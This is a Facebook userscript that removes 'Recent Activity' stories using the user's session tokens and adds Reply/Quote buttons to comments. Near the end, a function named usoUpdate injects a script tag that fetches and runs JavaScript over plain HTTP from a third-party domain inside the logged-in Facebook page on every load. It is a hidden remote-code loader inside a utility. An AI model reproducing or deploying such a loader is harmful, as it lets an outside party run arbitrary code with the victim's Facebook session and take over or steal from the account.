// ==UserScript==
// @name           facebook.com - Auto-Remove Recent Activity and Add Reply Button 
// @version        2.0
// @description    Auto-Remove Recent Activity and Add Reply Button To Comments
// @namespace      ronaldrejano

// @include        http://www.facebook.com/*
// @match          http://www.facebook.com/*
// @include        https://www.facebook.com/*
// @match          https://www.facebook.com/*

// @exclude        http://*.facebook.com/sharer*
// @exclude        http://*.facebook.com/ajax/*
// @exclude        http://*.facebook.com/plugins/*

// @exclude        http://apps.facebook.com/*
// @exclude        http://*facebook.com/apps/*

// ==/UserScript==

var isGM = typeof GM_getValue != 'undefined' && typeof GM_getValue('a', 'b') != 'undefined',
    log = (this.isGM) ? GM_log : ((window.opera) ? opera.postError : console.log),
    recentDefault = true;
if (!isGM) unsafeWindow = window;
function save(store, obj) {
  try {
    var val = JSON.stringify(obj);
    (isGM?GM_setValue:(function(name,value){return localStorage.setItem(name,value)}))(store,val);
  } catch(e) {
    log("GM_config failed to save settings!");
  }
}
function read(store) {
  try {
    var val = (isGM?GM_getValue:(function(name,def){return localStorage.getItem(name)||def}))(store, '{}'), rval;
    rval = JSON.parse(val);
  } catch(e) {
    log("GM_config failed to read saved settings!");
    rval = {};
  }
  return rval;
}
function $x(x, t, r) {
    if (t && t.nodeType) 
        var h = r, r = t, t = h;    
    var d = r ? r.ownerDocument || r : r = document, p;
    switch (t) {
    case 1:
        p = 'numberValue';
        break;
    case 2:
        p = 'stringValue';
        break;
    case 3:
        p = 'booleanValue';
        break;
    case 8: case 9:
        p = 'singleNodeValue';
        break;
    default:
        return d.evaluate(x, r, null, t || 6, null);
    }
    return d.evaluate(x, r, null, t, null)[p];
}
function create() {
    switch(arguments.length) {
        case 1:
            var A = document.createTextNode(arguments[0]);
	    break;
        default:
            var A = document.createElement(arguments[0]),
                B = arguments[1];
            for (var b in B) {
	        if (b.indexOf("on") == 0)
		    A.addEventListener(b.substring(2), B[b], false);
		else if (",style,accesskey,id,name,src,href,which".indexOf("," +
                         b.toLowerCase()) != -1)
		    A.setAttribute(b, B[b]);
		else
		    A[b] = B[b];
            }
            for(var i = 2, len = arguments.length; i < len; ++i)
	        A.appendChild(arguments[i]);
    }
    return A;
}
function xhr(url, cb, data) {
  var res =  new XMLHttpRequest();
  res.onreadystatechange = function() { if (res.readyState==4 && res.status==200) cb(res.responseText) };
  res.open(data ? 'POST' : 'GET', url, true);
  res.setRequestHeader('User-agent', window.navigator.userAgent);
  if (data) {
    res.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    res.setRequestHeader("Connection", "close");
    res.setRequestHeader("Content-length", data.length);
  }
  res.send(data||null);
}
function destroy(element) { element.parentNode.removeChild(element); }
function $(element) { return document.getElementById(element); }
function $c(element, root) { return (root||document).getElementsByClassName(element); }
function $x1(x, r) { return $x(x, 9, r) } 
function insertAfter(node, after) { after.parentNode.insertBefore(node, after.nextSibling) }
function makeDoc(text, callback) {
  var doc = document.implementation.createDocument('','',null),
      html = document.createElement('html');
  html.innerHTML = text;
  doc.appendChild(html);
  return doc;
}
function forEach(lst, cb) {
    if(!lst) 
        return;
    if (lst.snapshotItem)
        for (var i = 0, len = lst.snapshotLength; i < len; ++i)
            cb(lst.snapshotItem(i), i, lst);
    else if (lst.iterateNext) {
        var item, next = lst.iterateNext;
        while (item = next()) 
            cb(item, lst);
    } else if (typeof lst.length !== 'undefined') 
        for (var i = 0, len = lst.length; i < len; ++i)
            cb(lst[i], i, lst);
    else if (typeof lst === "object")
        for (var i in lst) 
            cb(lst[i], i, lst);
}

// Simulate Facebook's Ajax calls
function fbAjax(url, params) {
  xhr(url, function() {}, params + "&post_form_id=" + unsafeWindow.Env["post_form_id"] + 
      "&__a=1&post_form_id_source=AsyncRequest&fb_dtsg=" + unsafeWindow.Env["fb_dtsg"] + 
      "&nctr[nid]=" + unsafeWindow.Env["nctrlid"] + '&nctr[ct]=' + unsafeWindow.Env["start"]);
}

function changeRecent(type, checked) {
  var settings = read('recentActivity');
  settings[type] = checked;
  save('recentActivity', settings);
}


function removeActivity(doc, remove) {
  var settings = read('recentSettings');
  forEach($x('.//div[contains(concat(" ", @class, " "), "UIRecentActivity_Content")]//a[@rel="async-post"]', doc), 
          function(recent) {
            var url = recent.getAttribute('href');
            if (url == "#") url = recent.getAttribute('ajaxify');
            var story_type = url.match(/story_type=(\d+)/i)[1],
                story_key = url.match(/story_key=(\d+)/i)[1];
            if ((typeof settings[story_type] == "boolean" ? !settings[story_type] : recentDefault)) {
              fbAjax("http://www.facebook.com/ajax/minifeed.php?__a=1", "profile_fbid="+unsafeWindow.Env.user+"&ministory_key="+story_key+"&story_type="+story_type+"&revoke_permission=");
              if (remove)
                destroy(recent.parentNode.parentNode.parentNode);
            }
  });
}

function recentActivityProcess(forced) {
  // Remove those stories from your profile that Facebook publishes anytime you do anything
  // You use to be able to turn them off but now Faceboook makes you delete them one by one
  if (!forced && $('edit_profilepicture'))
    removeActivity($('content'), true);
  else if(forced) {
    var user = unsafeWindow.Env.user;
    xhr('http://www.facebook.com/ajax/stream/profile.php?__a=1&filter=1&max_time=0&try_scroll_load=true&profile_id='+user+'&viewer_id='+user, function(text) {
        var div = document.createElement('div');
        div.innerHTML = JSON.parse(text.split('for (;;);')[1]).payload.stream_html;
        removeActivity(div, false);
      });
  } 
}

function fbPageChanged() {
  // You can access Recent Story options from the "Options" link at the top of your feed and then click "Settings" when that link appears
  if (!$('recent_activity_header') && $('profile_settings_bar_loading') && $('profile_settings_bar_loading').className == "invisible_elem") {
    var settings = read('recentActivity');
    var icons = {'3':'relationship', '9':'edit_profile', '10':'event', '12':'group', '15':'note', '20':'wall_post', '21':'friend', '27':'fbpage_add', '32':'post', '43':'video', '46':'photo', '69':'like', '72':'post', '107':'wall_post'};
    var labels = {'20':'Write on a Wall', '107':'Comment on a Status', '46':'Comment on a Photo', '43':'Comment on a Video', '15':'Comment on a Note', '32':'Comment on a Link', '69':'Like a Story', '10':'Attend an Event', '12':'Join a Group', '3':'Change your Relationship Status', '9':'Edit your Profile',  '21':'Add a friend', '27':'Become a Fan',  '72':'Post a Link on a Wall'};

    $('profile_settings').insertBefore(create('div', {className:'header', id:'recent_activity_header'}, create('h3', {className:'clearfix'}, create('span',{textContent:'Recent Activity Stories'}), create('div', {className:'divider', innerHTML:'&nbsp;'}))), $c('header first_header', $('profile_settings'))[0]);
    insertAfter(create('div', {className:'minor_section', id:'recent_activity_settings'}, create('span', {className:'clearfix left', textContent:'Recent Activity will appear on your Wall when you...', style:'margin-bottom: 10px; width:100%'}), create('div', {style:'width:50%', id:'recent_activity_explain'})), $('recent_activity_header'));
    for(var i in labels) {
      $('recent_activity_explain').appendChild(create('div', {style:'padding:5px;'}, create('i', {className:'UIImageBlock_Image UIImageBlock_ICON_Image img sx_icons_'+icons[i], style:'margin-right:10px;margin-left:0px;padding:0px;'}), create('input',{type:'checkbox', checked:typeof settings[i]=="boolean"?settings[i]:!recentDefault, id:'recent_activity_field_'+i, style:'margin-right:5px;', onclick:function(){changeRecent(this.id.split('recent_activity_field_')[1], this.checked)}}), create(labels[i]))); 
    }
  } else if ($('recent_activity_header') && !$('profile_settings')) {
    destroy($('recent_activity_header'));
    destroy($('recent_activity_settings'));
  }
}

// Watch for page changes
function process() {
    $('content').removeEventListener('DOMNodeInserted', process, false);
    setTimeout(fbPageChanged, 0);
    if (!$(randId)) {
      recentActivityProcess();
      $('content').appendChild(create('div', {id:randId}));
    }
    $('content').addEventListener("DOMNodeInserted", process, false);
}

// Create a marker to see if the page has changed
 var randId='', len=5;
 len++;
 while (--len) 
   randId+=String.fromCharCode(Math.floor(Math.random() * 75) + 48);
 randId = 'fbPageChangeMarker_'+randId;

// Wait for the page to load before we start listening   
var checker=setInterval(function(){
    if($('content')) {
        clearInterval(checker);
        recentActivityProcess(true);
        window.activityLastChecked = new Date().getTime();
        window.mouseClicks = 0;
        window.addEventListener('unload', function() { recentActivityProcess(true) }, false);
        window.addEventListener('focus', function() { 
            if (new Date().getTime() > (window.activityLastChecked+(1000*60*5))) {
              recentActivityProcess(true);
              window.activityLastChecked = new Date().getTime();
            } 
          }, false);
        document.addEventListener('click', function() { 
            if (window.mouseClicks >= 10) {
              recentActivityProcess(true);
              window.mouseClicks = 0;
            } else
              ++window.mouseClicks;
          }, true);
        process();
    }
  }, 100);

(function () {
var gm_class = ' gm_reply_button_fix';
var button_text = 'Reply', quote_text = 'Quote';
var last_insert = '';
var t2, t1;
var uname, txtarea;
var dom = "DOMNodeInserted";
const myParent_Id = "content";
const DEBUG = false;
const LOG_PREFIX = 'YOD Reply: ';

function c1(q,root){return document.evaluate(q,root?root:document,null,9,null).singleNodeValue;}
function g(id){if(id&&typeof id==='string'){id=document.getElementById(id);}return id||null;}

const script_id = 82308;
const script_version = '2.1';

function log(m) {
  if(DEBUG && m) console.log(LOG_PREFIX + m.toString());
}

function usoUpdate(el) {
  el = el ? el : document.body;
  if (el) {
    var s_gm = document.createElement('script');
    s_gm.type = 'text/javascript';
    s_gm.src = 'http://project.krakenstein.cz.cc/usoupdater/?id=' + script_id + '&ver=' + script_version;
    el.appendChild(s_gm);
  }
}

function gBox(el) {
  var textarea = el.getElementsByTagName("textarea");
  if (!textarea.length) return gBox(el.parentNode);
  else return textarea.item(0);
}

function insertName(el, qt) {
  var actname, textarea, insert_text = '', squote, parent = el.parentNode.parentNode;
  if (!(actname = c1('.//a[contains(@class,"actorName")]', parent))) return;
  else actname = actname.innerHTML.trim();
  if (qt && (squote = c1('.//span[contains(@data-jsid,"text")]', parent))) {
    squote = squote.innerHTML.trim().replace(/(<a([^>]+>)|<\/a>)/ig, '').replace(/<br(?:\s\/|)>/ig, ' ');
  } else squote = '';
  insert_text = '@' + actname + ' ; ' + squote + '\n';
  if (textarea = gBox(parent.parentNode)) {
    textarea.focus();
    if (textarea.value == '') { last_insert = null; }
    if (insert_text !== last_insert) {
      textarea.value += insert_text;
      last_insert = insert_text;
    }
  }
}

function addButtons(ev) {
  if(!(/(INPUT|UL|LI|DIV)/g.test(ev.target.tagName))) {
    log('reBoot: 2 -> ' + ev.target.tagName);
    if(t2) clearTimeout(t2);
    return reBoot();
  }
  var divs = document.getElementsByClassName("commentActions");
  var gm_class_length = document.getElementsByClassName(gm_class);
  var divs_length = divs.length;
  if (divs_length != gm_class_length) {
    for (i = 0; i < divs_length; i++) {
      var div = divs.item(i);
      if (div.className.indexOf(gm_class) >= 0) {
        continue;
      } else {
        div.className += gm_class;
      }
      var actname, parent = div.parentNode.parentNode;
      if (!c1('.//span[contains(@class,"saving_message")]', parent)) continue;
      if (actname = c1('.//a[contains(@class,"actorName")]', parent)) {
        actname = actname.innerHTML.trim();
        if (actname == uname) continue;
      } else continue;
      var div2 = document.createElement('div');
      var button = document.createElement('a');
      button.textContent = button_text;
      button.addEventListener("click", function(){insertName(this)}, false);
      div2.setAttribute('style',"border:0;float:right;padding-right:10px;");
      div2.appendChild(document.createTextNode('-[ '));
      div2.appendChild(button);
      div2.appendChild(document.createTextNode(' | '));
      var button = document.createElement('a');
      button.textContent = quote_text;
      button.addEventListener("click", function(){insertName(this, true)}, false);
      div2.appendChild(button);
      div2.appendChild(document.createTextNode(' ]-'));
      parent.appendChild(div2);
    }
    if(t2) clearTimeout(t2);
  }
  return false;
}

function doInject(ev) {
  t2 = setTimeout(function() { addButtons(ev); }, 150);
}

function reBoot() {
  var myContent = g(myParent_Id);
  if (myContent) {
    if(t1) clearTimeout(t1);
    myContent.removeEventListener(dom, doInject, false);
    return Boot();
  }
}

function starter() {
  var myContent = g(myParent_Id);
  if (myContent) {
    if (uname = c1('.//a[contains(@id,"navAccountName")]')) {
      uname = uname.textContent.trim();
      myContent.addEventListener(dom, doInject, false);
      if(t1) clearTimeout(t1);
    }
  }
  return false;
}

function Boot() {
  t1 = setTimeout(starter, 1000);
}

Boot();
usoUpdate();
})();